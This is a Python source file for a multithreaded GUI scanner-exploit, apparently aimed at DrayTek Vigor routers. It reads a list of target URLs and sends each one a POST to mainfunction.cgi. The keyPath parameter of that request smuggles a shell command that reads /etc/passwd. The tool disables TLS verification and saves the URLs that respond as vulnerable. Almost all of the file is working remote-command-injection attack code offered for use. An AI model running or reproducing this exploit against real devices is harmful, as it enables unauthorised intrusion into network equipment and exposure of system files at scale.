import requests
import tkinter as tk
from tkinter import *
from PIL.ImageTk import PhotoImage
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
from urllib3.exceptions import InsecureRequestWarning
def vigor_rce_exp(url):
    vuln_url = url + "/cgi-bin/mainfunction.cgi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    data = "action=login&keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%0A%27&loginUser=a&loginPwd=a"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if "root" in response.text and response.status_code == 200:
            vigor_rce_text.insert(END, "-------------------------------\n[! ! ! ! ! ! ] Vulnerable url:" + url + "\n-------------------------------\n")
            vigor_rce_text.see(END)
            with open ("[exists]DrayTek_network_devices_rce_url.txt", 'a+') as f:
                f.write(url + "\n")
        else:
            vigor_rce_text.insert(END, "[×]URL without vulnerability:" + url + "\n")
            vigor_rce_text.see(END)
    except Exception as err:
        vigor_rce_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        vigor_rce_text.see(END)
def get_vigor_rce_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def vigor_rce_gui():
    vigor_rce = Toplevel()
    vigor_rce.geometry("1035x455")
    vigor_rce.title("DrayTek Enterprise Network Equipment RCE [auto-muti-exp]")
    vigor_rce.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    vigor_rce.tk.call('wm', 'iconphoto', vigor_rce._w, logo)
    global vigor_rce_text
    vigor_rce_text = scrolledtext.ScrolledText(vigor_rce,width=123, height=25)
    vigor_rce_text.grid(row=0, column=0, padx=10, pady=10)
    vigor_rce_text.see(END)
    addrs = get_vigor_rce_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(vigor_rce_exp, addr)
    vigor_rce.mainloop()